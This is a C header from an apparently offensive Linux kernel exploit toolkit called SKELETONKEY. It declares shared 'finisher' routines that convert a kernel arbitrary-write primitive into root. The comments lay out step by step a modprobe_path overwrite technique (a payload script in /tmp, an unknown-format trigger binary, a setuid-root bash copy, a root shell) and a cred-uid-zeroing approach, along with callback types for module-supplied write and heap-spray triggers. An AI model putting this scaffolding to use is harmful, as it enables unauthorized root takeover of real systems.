/*
 * SKELETONKEY — shared finisher helpers for full-chain root pops.
 *
 * The 🟡 PRIMITIVE modules each land a kernel-side primitive (heap-OOB
 * write, slab UAF, etc.). The conversion to root is almost always one
 * of two patterns:
 *
 *   A) "modprobe_path overwrite":
 *        - kernel arb-write at &modprobe_path[0] with a userspace path
 *        - execve() an unknown-format binary triggers do_coredump's
 *          fallback to call_modprobe(), which spawns modprobe_path
 *          as init/root running our payload
 *
 *   B) "current->cred->uid overwrite":
 *        - kernel arb-write at &current_task->real_cred->uid = 0
 *          (and cap_*, fsuid, etc. for completeness)
 *        - setuid(0); execve("/bin/sh")
 *
 * Pattern (A) is much simpler — only one kernel address needed
 * (modprobe_path) and the trigger is just execve("/tmp/unknown").
 * Pattern (B) needs a self-cred chase + multiple writes.
 *
 * Modules provide their own arb-write primitive via the
 * skeletonkey_arb_write_fn callback; this file wraps the rest.
 */

#ifndef SKELETONKEY_FINISHER_H
#define SKELETONKEY_FINISHER_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include "offsets.h"

/* Arb-write primitive: write `len` bytes from `buf` to kernel VA
 * `kaddr`. Module-specific implementation. Returns 0 on success,
 * negative on failure. `ctx` is opaque module state. */
typedef int (*skeletonkey_arb_write_fn)(uintptr_t kaddr,
                                    const void *buf, size_t len,
                                    void *ctx);

/* Trigger that fires the arb-write. Many modules need to set up the
 * groomed slab THEN call the trigger. The trigger is a separate fn
 * because some modules need to re-spray before each write. NULL is
 * acceptable if the arb-write is self-contained. */
typedef int (*skeletonkey_fire_trigger_fn)(void *ctx);

/* Pattern A: modprobe_path overwrite + execve trigger. Caller has
 * already populated `off->modprobe_path`. Implementation:
 *   1. Write payload script to /tmp/skeletonkey-mp-<pid>
 *   2. arb_write(off->modprobe_path, "/tmp/skeletonkey-mp-<pid>", 24)
 *   3. Write unknown-format file to /tmp/skeletonkey-trig-<pid>
 *   4. chmod +x both, execve() the trigger → kernel-call-modprobe
 *      → our payload runs as root → payload writes /tmp/skeletonkey-pwn
 *      and/or copies /bin/bash to /tmp with setuid root
 *   5. Wait for sentinel file, exec'd the setuid-bash → root shell
 *
 * Returns SKELETONKEY_EXPLOIT_OK if we got a root shell back (verified
 * via geteuid() == 0), SKELETONKEY_EXPLOIT_FAIL otherwise. */
int skeletonkey_finisher_modprobe_path(const struct skeletonkey_kernel_offsets *off,
                                   skeletonkey_arb_write_fn arb_write,
                                   void *arb_ctx,
                                   bool spawn_shell);

/* Pattern B: cred uid overwrite. Caller has populated init_task +
 * cred offsets. Implementation:
 *   1. Walk task linked list from init_task to find self by pid
 *      (this requires arb-READ too — not supplied here; B-pattern
 *      modules need to provide their own variant)
 * For now this is a STUB returning SKELETONKEY_EXPLOIT_FAIL with a
 * helpful error. */
int skeletonkey_finisher_cred_uid_zero(const struct skeletonkey_kernel_offsets *off,
                                   skeletonkey_arb_write_fn arb_write,
                                   void *arb_ctx,
                                   bool spawn_shell);

/* Diagnostic: tell the operator how to populate offsets manually. */
void skeletonkey_finisher_print_offset_help(const char *module_name);

#endif /* SKELETONKEY_FINISHER_H */
